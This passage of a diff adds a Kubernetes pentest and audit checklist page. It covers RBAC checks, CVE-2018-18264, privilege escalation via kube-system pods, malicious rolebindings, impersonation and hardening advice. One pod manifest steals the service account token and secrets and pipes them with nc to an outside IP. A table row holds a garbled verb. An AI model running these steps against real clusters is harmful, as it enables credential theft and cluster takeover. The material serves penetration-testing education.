+kubectl get clusterrolebindings -o json &gt; clusterrolebindings.json
+
+python ExtensiveRoleCheck.py --clusterRole clusterroles.json  --role Roles.json --rolebindings rolebindings.json --cluseterolebindings clusterrolebindings.json
+</code></pre>
+
+<p>To list service accounts:</p>
+<pre><code>kubectl get serviceaccounts -A
+</code></pre>
+
+<ul>
+<li>[ ] Check for interesting user and service account rights</li>
+</ul>
+<p>One kind of complicated way to test what a specific user can do is to run the following</p>
+<pre><code># Check if your current user can run `exec` on pods.
+kubectl auth can-i exec pods
+kubectl auth can-i get pods
+</code></pre>
+
+<p>Take low priviliged account that you have been given or compromised, and use that account when you run:</p>
+<pre><code>kubectl auth can-i --list
+kubectl auth can-i --list -n SomeNameSpace
+</code></pre>
+
+<p>So what to look for?
+Look for the verb <code>list</code> together with <code>secrets</code>. That might mean that you can list other users secrets, and steal their JWT token.</p>
+<table>
+<thead>
+<tr>
+<th>Resource</th>
+<th>Verb</th>
+<th>Comment</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>secrets</td>
+<td>list or *</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>secrets</td>
+<td>get</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>*</td>
+<td>get</td>
+<td>Can be used to get secrets.</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>asdasdlasdhaklw</td>
+<td>Can be used to get secrets.</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>[ ] Check for CVE: CVE-2018-18264 Privilige Escalation</li>
+</ul>
+<pre><code>kubectl proxy 8001
+</code></pre>
+
+<p>In your browser go to http://localhost:8001
+If you can access it, klick on "skip" for the authentication.
+The go to URL: <code>/api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs</code> and see if you can get some secrets.</p>
+<p>The simple way to check this is to see if the kubernetes version is below: 1.10.1</p>
+<pre><code>kubectl version
+</code></pre>
+
+<p>https://sysdig.com/blog/privilege-escalation-kubernetes-dashboard/</p>
+<ul>
+<li>[ ] Create Pod in kube-system namespace and automount service account</li>
+</ul>
+<p>So if you have a kubernetes user that can deploy pods in any namespace you can mount in a high priviliged service account into the the pod, and then extrct those credentials. This can be done in the following way.</p>
+<p>Deploy the following pod:</p>
+<pre><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: alpinetest
+  namespace: kube-system
+spec:
+  containers:
+  - name: alpine
+    image: alpine
+    command: [&quot;/bin/sh&quot;]
+    args: [&quot;-c&quot;, 'apk update &amp;&amp; apk add curl --no-cache; sleep 100000']
+  serviceAccountName: bootstrap-signer
+  automountServiceAccountToken: true
+  hostNetwork: true
+</code></pre>
+
+<p>This technique can be used if your user does not have the permission to list secrets, but is allowed to deploy pods in any namespace.
+Also, you do not have to have the <code>exec</code> permission to use the attack. You can deploy the pod to automatically send the credentials, like this:</p>
+<pre><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: alpine
+  namespace: kube-system
+spec:
+  containers:
+  - name: alpine
+    image: alpine
+    command: [&quot;/bin/sh&quot;]
+    args: [&quot;-c&quot;, 'apk update &amp;&amp; apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H &quot;Authorization: Bearer $TOKEN&quot; -H &quot;Content-Type: application/json&quot; https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
+  serviceAccountName: bootstrap-signer
+  automountServiceAccountToken: true
+  hostNetwork: true
+</code></pre>
+
+<ul>
+<li>[ ] Deploy pods using Create/update deployment, Daemonsets, statefulsets,Replicationcontrollers, Replicasets, Jobs, Cronjobs</li>
+</ul>
+<p>There are many ways to deploy pods. Even if your user is not allowed to create a pod it might be possible to create pods using other types of workloads. All these ways can be used to deploy pods and possibily escalate priviliges using the technique explained in the issue above.</p>
+<p>Workloads that can be used to create pods are the following:</p>
+<pre><code>Create/update deployments
+Daemonsets
+Statefulsets
+Replicationscontrollers
+Replicasets
+Jobs
+Cronjobs
+</code></pre>
+
+<p>Readthe documentation for each for in order to see how to do it. As in the attack above you will need to be able to deploy in the namespace <code>kube-system</code>.
+https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-1/</p>
+<ul>
+<li>[ ] Privilige to use Pods/Exec</li>
+</ul>
+<p>This is pretty simple. But if your user has the permission to perform <code>pods/exec</code> with any namespace you can simply enter into any pod, and extract the default service accounts.</p>
+<pre><code>kubectl exec -it &lt;POD NAME&gt; -n &lt;POD’S NAMESPACE&gt; -- sh
+</code></pre>
+
+<ul>
+<li>[ ] Privilege to Get/patch rolebindings</li>
+</ul>
+<p>The idea here is if your user has the permission to edit rolebindings that use can simply bind a user to the ClusteAdmin role and thereby escalate priviliges to the highest.</p>
+<p>Check your priviliges with your low priviliges user with the following command:</p>
+<pre><code>kubectl auth can-i --list
+</code></pre>
+
+<p>If you have the permission to create Rolebindings you can create a malicious rolebinding like this:
+You might have to change the namespace and the service account to your service account and namespace.</p>
+<pre><code class="yaml">{
+    &quot;apiVersion&quot;: &quot;rbac.authorization.k8s.io/v1&quot;,
+    &quot;kind&quot;: &quot;RoleBinding&quot;,
+    &quot;metadata&quot;: {
+        &quot;name&quot;: &quot;malicious-rolebinding&quot;,
+        &quot;namespace&quot;: &quot;default&quot;
+    },
+    &quot;roleRef&quot;: {
+        &quot;apiGroup&quot;: &quot;*&quot;,
+        &quot;kind&quot;: &quot;ClusterRole&quot;,
+        &quot;name&quot;: &quot;admin&quot;
+    },
+    &quot;subjects&quot;: [
+        {
+            &quot;kind&quot;: &quot;ServiceAccount&quot;,
+            &quot;name&quot;: &quot;default&quot;,
+            &quot;namespace&quot;: &quot;default&quot;
+        }
+    ]
+}
+</code></pre>
+
+<p>If it works you can use the token of the service account to do anything to want in the cluster.</p>
+<ul>
+<li>[ ] Check for impersonation privileges</li>
+</ul>
+<p>There exists a functionality to impersonate service accounts. This can be used if you want to check that a a serviceaccount has apropriate priviliges, but it can also be used for malicious intents.</p>
+<pre><code>curl -k -v -XGET -H “Authorization: Bearer &lt;JWT TOKEN (of the impersonator)&gt;” -H “Impersonate-Group: system:masters” -H “Impersonate-User: null” -H “Accept: application/json” https://&lt;master_ip&gt;:&lt;port&gt;/api/v1/namespaces/kube-system/secrets/
+
+</code></pre>
+
+<ul>
+<li>[ ] Check if RBAC is used</li>
+</ul>
+<p>Role-Based Access Control has been the stable since version 1.8</p>
+<p>RBAC is enabled by the apiserver by starting the apiserver with this flag <code>--authorization-mode=RBAC</code></p>
+<p>If you don't ahve access to the apiserver flags you can check it interactivly by running: </p>
+<pre><code>kubectl api-versions
+</code></pre>
+
+<p>If you see the following output RBAC is enabled:</p>
+<pre><code>rbac.authorization.k8s.io/v1
+rbac.authorization.k8s.io/v1beta1
+
+</code></pre>
+
+<p>If Kubernetes is run as a managed cluster with Azure you can check if with the following:</p>
+<pre><code>az aks list
+</code></pre>
+
+<p>Check for:</p>
+<pre><code>RBAC true
+</code></pre>
+
+<p>However, it is still possible to disable. Do check that it is enabled.</p>
+<h2 id="security-audit">Security Audit<a class="headerlink" href="#security-audit" title="Permanent link">#</a></h2>
+<p>The security audit is a profile used when the tester has a kubernetes user with read privileges and is able to talk to the apiserver.</p>
+<ul>
+<li>[ ] Check if PodSecurityPolicy is supported</li>
+</ul>
+<p>It might be that kubernets is started without enabling PSP.</p>
+<pre><code>kubectl get psp
+</code></pre>
+
+<p>If PSPS is not supported, or enabled you will get the following error:</p>
+<pre><code>the server doesn't have a resource type &quot;podSecurityPolicies&quot;.
+</code></pre>
+
+<p>If it is supported you get either the policies or an error such as:</p>
+<pre><code>No resources found
+</code></pre>
+
+<p><strong>Recommendation</strong></p>
+<p>Enable PSP. This is done differently according to the vendor. In Minikube it can be done the following way:</p>
+<pre><code>minikube start --extra-config=apiserver.GenericServerRunOptions.AdmissionControl=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds,PodSecurityPolicy
+</code></pre>
+
+<ul>
+<li>[ ] Check if PodSecurityPolicy is used</li>
+</ul>
+<p>Remember to add the <code>-A</code> flag, so that you can view the podsecurity policies in all namespaces.</p>
+<pre><code>kubectl get psp -A
+kubectl describe psp
+</code></pre>
+
+<p>Inspect the PSPs.
+Now you need to figure out which PSPs are actually used. PSPs are applied to Pods using annotations.</p>
+<p>If you are clusteradmin, and can check all pods in all namespaces, you can run the following command:</p>
+<pre><code>kubectl describe pods -A
+</code></pre>
+
+<p>Now check the annotations part to see which PSP is applied to each Pod. The annotation part usually look something like this:</p>
+<pre><code>Annotations:    kubernetes.io/psp: &lt;name of PSP&gt;
+</code></pre>
+
+<ul>
+<li>[ ] Static analysis of yaml files - Searching for secrets</li>
+</ul>
+<p>Secrets should not be stored in the yaml configuration for workloads such as pods, deployments, jobs etc. Maybe a secret is stored in an environment variable in the a yaml, and that yaml is accessible to everyone.</p>
+<pre><code>kubectl describe pods -A
+kubectl describe deployments -A
+</code></pre>
+
+<p>There are a lot of other bad configurations that can be introduced. One way to check these is with the tool kubesec. I have not used this tool, and not audited it. So run it on your own responsibility.
+https://kubesec.io/
+I think you can just output the yaml file and then run it in kubesec.</p>
+<pre><code>kubectl describe deployments -A &gt; describe-deployments.txt
+cat -n describe-deployments.txt | sed -n '/Environment/,/Mount/p'
+</code></pre>
+
+<pre><code>kubectl get pod kubeaudit-6f5964556b-5vnk5 -o yaml
+</code></pre>
+
+<ul>
+<li>[ ] Check that pods are running as non-root users</li>
+</ul>
+<p>By having the services on the containers running as  a non-root user it makes it more difficult for an attacker to escape the the container to the host os. The container is sandboxed from other containers running on the host with the help of linux namespaces. It is more probable that a container breakout is possible if the pod is running as root.</p>
+<p>Another reason to not run a service as root is that if kubernetes has been misconfigured to accidentally expose volumes to the container, the volume will still not be able to mount because of lacking root priviliges.</p>
+<p>This can be verified the following way, albeit not perfectly. This way will only show if the service in the container is running as root or some other user. It might be that it is possible to run <code>sudo su</code> and escalate priviliges.</p>
+<pre><code>kubectl -n thenamespace exec mypod whoami
+and
+kubectl -n thenamespace exec -it mypod /bin/bash
+</code></pre>
+
+<p>Therefore it is better to configure a PodSecurityPolicy to handle the problem.</p>
+<p>It is possible to create a PodSecurityPolicy that disallows containers to run as root. If such a policy exists the apiserver will disallow the deployment of a container that is running as root.</p>
+<p>The following lines in a PodSecurityPolicy disallows containers from running as root.</p>
+<pre><code># Required to prevent escalations to root.
+allowPrivilegeEscalation: false
+runAsUser:
+  # Require the container to run without root privileges.
+  rule: 'MustRunAsNonRoot'
+</code></pre>
+
+<p>One issue that might occur here is that the app cant use ports below 1024. This can be solved by running the app on a higher port, by expose it on a lower. An example of this could be the following:</p>
+<pre><code class="yaml">kind: Service
+apiVersion: v1
+metadata:
+  name: my-service
+spec:
+  selector:
+    app: MyApp
+  ports:
+  - protocol: TCP
+    port: 443
+    targetPort: 8443
+</code></pre>
+
+<p>https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/</p>
+<ul>
+<li>[ ] Check the usage of network policies</li>
+</ul>
+<p>NetworkPolicy is just a kubernetes-word for firewall.
+By default all pods in the kubernetes cluster is allowed to talk to all pods. There is not segmentation between pods. 
+This can be restricted with network policies. </p>
+<pre><code>kubectl get networkpolicies -A
+</code></pre>
+
+<p>This is an example of a network policy:</p>
+<pre><code>apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: myapp-deny-external-egress
+spec:
+  podSelector:
+    matchLabels:
+      app: myapp
+  policyTypes:
+  - Egress
+  egress:
+  - ports:
+    - port: 53
+      protocol: UDP
+  - to:
+    - namespaceSelector: {}
+</code></pre>
+
+<h2 id="resources">Resources<a class="headerlink" href="#resources" title="Permanent link">#</a></h2>
+<p>https://dev.to/petermbenjamin/kubernetes-security-best-practices-hlk</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../attacking_kubernetes_checklist/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../attacking_kubernetes_checklist/" class="btn btn-xs btn-link">
+        Attacking Kubernetes Checklist
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../kubernetes_hacking_tools/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../kubernetes_hacking_tools/" class="btn btn-xs btn-link">
+        Setting Up Tools
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_kubernetes/attacking_kubernetes.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
